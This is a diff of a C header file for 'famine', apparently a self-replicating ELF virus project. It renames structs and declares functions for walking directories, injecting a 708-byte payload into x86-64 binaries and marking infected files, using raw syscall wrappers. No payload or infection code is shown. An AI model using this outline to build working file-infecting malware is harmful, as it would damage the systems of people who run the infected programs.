@@ -20,30 +20,26 @@
 /// LOGGER 
 ////////////////////////////////////////////////////////////////////////////////
 
-int g_fd;
-
-#define LOG(x) dprintf(g_fd, "%s(%d)\t= %s(%s)\n", __FILE__, __LINE__, __PRETTY_FUNCTION__, x)
-#define ERR(x) dprintf(g_fd, "\033[0;31m%s(%d)\t= %s(%s)\033[0m\n", __FILE__, __LINE__, __PRETTY_FUNCTION__, x)
-#define OK(x) dprintf(g_fd, "\033[0;32m%s(%d)\t= %s(%s)\033[0m\n", __FILE__, __LINE__, __PRETTY_FUNCTION__, x)
+#define FUNC printf("\033[0;34m;%s()\033[0m\n\n", __PRETTY_FUNCTION__)
+#define ERR printf("\033[0;31m;%s()\033[0m\n\n", __PRETTY_FUNCTION__)
 
 ////////////////////////////////////////////////////////////////////////////////
 /// DEFINES
 ////////////////////////////////////////////////////////////////////////////////
 
+#define INFECTED_MAGIC_NUMBER 0x15D2
 #define ELF_MAGIC_SIZE 4
 #define ELF_MAGIC_NUMBER 1179403647
-#define INFECTED_MAGIC_NUMBER 0x15D25
+#define X86_64 2
 
 #define PAYLOAD_SIZE 708
 
-#define X86_64 2
+#define BUFF_SIZE 1024 * 1024
 
-#define FILE_TYPE 8
-#define DIR_MAX 12
+#define ROOT_SIZE 4
+#define USER_SIZE 2
 
-#define BUFF_SIZE 1024*1024*5
-
-#define VOID __attribute__((unused))
+#define CRITERIA_SIZE 4
 
 ////////////////////////////////////////////////////////////////////////////////
 /// STRUCTURES
@@ -60,12 +56,11 @@ struct linux_dirent64
 
 struct directory
 {
-	const char path[DIR_MAX];
-	char buf[PATH_MAX];
-	int size;
+	char path[PATH_MAX];
+	size_t entry;
 };
 
-struct elf
+struct s_info
 {
 	int fd;
 	void *ptr;
@@ -80,46 +75,38 @@ struct elf
 
 struct criteria
 {
-	bool (*f)(const Elf64_Ehdr *header);
+	bool (*fct)(const Elf64_Ehdr *header);
 };
+
 
 ////////////////////////////////////////////////////////////////////////////////
 /// PROTOTYPES 
 ////////////////////////////////////////////////////////////////////////////////
 
-// FAMINE_C
-void famine(struct directory *dir);
+// FAMINE
+__attribute__((hot)) void famine(const char *file, const size_t m_entry);
+void inject(const struct s_info *info, const size_t m_entry);
+void modify_segment(struct s_info *info);
 
-// INFECT_C
-__attribute__((hot)) void infect_file(const char *filename);
+// INFO
+struct s_info get_info(const char *str);
+void release_info(struct s_info *info);
 
-// SEGMENTS_C
-void modify_segments(struct elf *file);
-
-// HEADER_C
-void modify_header(struct elf *file);
-
-// INJECT_C
-void inject(const struct elf *file);
-
-// FILE_C
-struct elf get_file(const char *str);
-void release_file(struct elf *file);
-
-// INLINE_C
-int _open(const char *pathname, int flags, long mode);
-int _close(int fd);
-int _write(int fd, const void *buf, long count);
+// LIB
 int _getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
-int _stat(const char *pathname, struct stat *statbuf);
-int _getuid(void);
-void *_mmap(void *addr, unsigned long length, unsigned long prot, unsigned long flags, unsigned long fd, unsigned long offset);
+int _close(int fd);
+int _open(const char *pathname, int flags, long mode);
+void *_mmap(void *addr, unsigned long length,  unsigned long prot, unsigned long flags, unsigned long fd, unsigned long offset);
 int _munmap(void *addr, unsigned long length);
+int _getuid(void);
+int _stat(const char *pathname, struct stat *statbuf);
+int _write(int fd, const void *buf, long count);
+size_t get_random_integer(const size_t range);
+size_t _strlen(const char *str);
+void _bzero(char *str, const size_t size);
 
-// UTILS_C
-unsigned long _strlen(const char *str);
-void _bzero(char *str, const unsigned long index);
-int _strcmp(const char *s1, const char *s2);
-
+// DIRENT_C
+__attribute__((hot)) void update_entry(struct directory *dir);
+__attribute__((hot)) void update_path(struct directory *dir); 
 
 #endif
